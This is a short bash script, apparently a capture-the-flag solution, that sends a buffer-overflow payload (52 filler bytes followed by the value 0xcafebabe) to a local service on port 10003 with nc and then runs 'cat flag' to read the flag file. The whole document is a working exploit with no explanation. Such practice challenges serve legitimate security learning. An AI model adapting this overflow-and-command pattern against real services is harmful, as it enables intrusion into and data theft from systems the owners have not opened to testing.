#!/bin/bash 

REPEAT=$(printf "i%0.s" {1..52})
KEY=$'\xbe\xba\xfe\xca'
CMD="cat flag"


echo -e "$REPEAT$KEY\n$CMD\n" | nc 0 10003 


